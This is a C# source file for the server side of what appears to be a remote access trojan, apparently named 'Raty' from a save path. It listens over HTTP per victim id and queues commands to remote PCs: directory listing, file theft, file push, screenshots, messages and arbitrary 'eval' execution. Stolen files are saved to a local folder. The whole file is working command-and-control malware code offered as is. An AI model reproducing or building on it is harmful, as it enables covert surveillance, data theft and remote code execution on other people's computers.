using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;

namespace Server
{
    class Pcs
    {
        private List<Pc> _pcs;
        private Dictionary<string, Pc> pcs;
        public int Count
        {
            get
            {
                return _pcs.Count;
            }
        }

        public Pcs()
        {
            _pcs = new List<Pc>();
            pcs = new Dictionary<string, Pc>();
        }
        public void AddPc(Pc a)
        {
            _pcs.Add(a);
            pcs.Add(a.id, a);
            a.Disconnect += (obj, p) =>
            {
                _pcs.Remove(p);
                pcs.Remove(p.id);
            };
        }
        public void Remove(Pc a)
        {
            _pcs.Remove(a);
            pcs.Remove(a.id);
        }
        public Pc this[string id]
        {
            get
            {
                return pcs[id];
            }
        }
        public Pc this[int i]
        {
            get
            {
                return _pcs[i];
            }
        }
        public override string ToString()
        {
            string pcsz = string.Empty;
            for (int i = 0; i < _pcs.Count; i++)
            {
                pcsz += string.Format("#{0} PC: id = {1}, IP:{2}, last seen: {3}\n", i, _pcs[i].id, _pcs[i].IP, _pcs[i].LastSeen);
            }
            return pcsz;
        }
    }
    class Pc
    {
        public string id;
        HttpListener PcListen;
        public Queue<string> tasks;
        public string curentPath;
        public DateTime LastSeen;
        public string IP;
        public event EventHandler<Pc> Disconnect;
        bool stillLisening;
        public Pc(string id)
        {
            this.IP = string.Empty;
            Init(id);
        }
        public Pc(string id, string IP)
        {
            this.IP = IP;
            Init(id);
        }
        private void Init(string id)
        {
            this.id = id;
            stillLisening = true;
            tasks = new Queue<string>();
            curentPath = string.Empty; ;
            LastSeen = DateTime.Now;
            Task t = Listen();
            Task t1 = Checkinactive();
        }

        private async Task Checkinactive()
        {
            while (LastSeen.AddSeconds(20d) > DateTime.Now)
                await Task.Delay(1000);
            Ondc();
        }

        private void Ondc()
        {
            PcListen.Abort();
            stillLisening = false;
            Disconnect?.Invoke(null, this);
        }
        public override string ToString()
        {
            string s = string.Format("id: {0}, ip:{1}, last seen:{2}, unsolved tasks:{3}, curent path:{4}", id, IP, LastSeen, tasks.Count, curentPath);
            return s;
        }
        private async Task Listen()
        {

            PcListen = new HttpListener();
            PcListen.Prefixes.Add(string.Format("http://*:45678/main/{0}/", id));
            PcListen.Start();
            Console.WriteLine("Started Lisening on {0}", string.Format("http://*:45678/main/{0}/", id));
            while (stillLisening)
            {
                try
                {

                    var req = await PcListen.GetContextAsync();
                    LastSeen = DateTime.Now;
                    req.Response.AppendHeader("id", id);
                    string function = req.Request.Headers["func"];
                    if (function == null)
                    {
                        function = "nothing";
                    }
                    switch (function.ToLower())
                    {
                        case "nothing":
                            req.Response.AddHeader("task", GimeTasks());
                            req.Response.StatusCode = 200;
                            //req.Response.Close();
                            break;
                        case "document":
                            try
                            {
                                using (var stram = new StreamWriter("C:\\Users\\Branimir\\Documents\\RatyShit\\" + req.Request.Headers["FileName"]))
                                {
                                    Task t = req.Request.InputStream.CopyToAsync(stram.BaseStream);
                                    WebClient wc = new WebClient();
                                    while (!t.IsCompleted)
                                    {
                                        LastSeen = DateTime.Now;
                                        await Task.Delay(1000);
                                    }
                                    await t;
                                    Console.WriteLine("Succesfily downloaded {0} :)", req.Request.Headers["FileName"]);
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex);
                            }
                            //req.Response.Close();
                            break;
                        case "dir":
                            try
                            {
                                int len = Convert.ToInt32(req.Request.Headers["len"]);
                                byte[] buff = new byte[len + 20];
                                int n = await req.Request.InputStream.ReadAsync(buff, 0, len + 20);
                                Console.WriteLine(Encoding.UTF8.GetString(buff));
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex);
                            }
                            break;
                        case "error":
                            try
                            {
                                int len = Convert.ToInt32(req.Request.Headers["len"]);
                                byte[] buff = new byte[len + 20];
                                int n = await req.Request.InputStream.ReadAsync(buff, 0, len + 20);
                                Console.WriteLine(Encoding.UTF8.GetString(buff));
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex);
                            }
                            break;
                        case "needfile":
                            try
                            {
                                using (StreamReader sr = new StreamReader(req.Request.Headers["path"])) {
                                    FileInfo fi = new FileInfo(req.Request.Headers["path"]);
                                    req.Response.Headers.Add("FileName", fi.Name);
                                    req.Response.Headers.Add("len", fi.Length.ToString());
                                    await sr.BaseStream.CopyToAsync(req.Response.OutputStream);
                                }
                            }catch(Exception ex)
                            {
                                Console.WriteLine(ex);
                            }
                            break;
                        case "eror":
                            try
                            {
                                int len = Convert.ToInt32(req.Request.Headers["len"]);
                                byte[] bufy = new byte[len];
                                await req.Request.InputStream.ReadAsync(bufy, 0, len);
                                Console.WriteLine();
                                Console.WriteLine(this.ToString());
                                Console.WriteLine(Encoding.UTF8.GetString(bufy));

                            }catch(Exception ex)
                            {
                                Console.WriteLine(ex);
                            }
                            break;
                        case "eval":
                            try
                            {
                                int len = Convert.ToInt32(req.Request.Headers["len"]);
                                byte[] buff = new byte[len];
                                int n = await req.Request.InputStream.ReadAsync(buff, 0, len);
                                string outstr = Encoding.UTF8.GetString(buff).Split(new string[2] { "\n\n", "\0\0" }, StringSplitOptions.RemoveEmptyEntries)[0];
                                Console.WriteLine(outstr);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex);
                            }
                                break;
                        default:
                            Console.WriteLine("{0} not implented", function);
                            break;
                            
                    }
                    //byte[] msg = Encoding.UTF8.GetBytes(string.Format("Hello {0}!", id));
                    //await req.Response.OutputStream.WriteAsync(msg, 0, msg.Length);
                    req.Response.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }
            Console.WriteLine("Stopped Lisening on {0}", string.Format("http://*:45679/main/{0}/", id));
        }

        private string GimeTasks()
        {
            string res = string.Empty;

            while (tasks.Count > 0)
            {
                res += ";" + tasks.Dequeue();
            }
            return res;
        }

        public void CD(string path)
        {
            if (path == ".")
            {
                tasks.Enqueue("dir " + curentPath);
                return;
            }
            else if (path == "..")
            {
                List<string> p = curentPath.Split(new string[] { "/" }, StringSplitOptions.RemoveEmptyEntries).ToList();
                p.RemoveAt(p.Count - 1);
                curentPath = string.Empty;
                foreach (string s in p)
                {
                    curentPath += s + "/";
                }
                tasks.Enqueue("dir " + curentPath);
            }
            else
            {
                List<string> p = path.Split('/').ToList();
                foreach (string s in p)
                {
                    curentPath += s + "/";
                }
                tasks.Enqueue("dir " + curentPath);
            }
        }
        public void DIR()
        {
            tasks.Enqueue("dir " + curentPath);
        }
        public void DIR(string FullPath)
        {
            tasks.Enqueue("dir " + FullPath);
        }
        public void GetFile(string fileName)
        {
            tasks.Enqueue("get " + curentPath + fileName);
        }
        public void PushFile(string filePathOnThisPc)
        {
            tasks.Enqueue("push " + filePathOnThisPc);
        }
        public void SendMessage(string message)
        {
            tasks.Enqueue("msg" + message);
        }
        public void screenshot()
        {
            tasks.Enqueue("screeshot");
        }
        public void Eval(string argz)
        {
            tasks.Enqueue($"eval {argz}");
        }
        public void idyourshelf()
        {
            tasks.Enqueue("id");
        }
    }
}
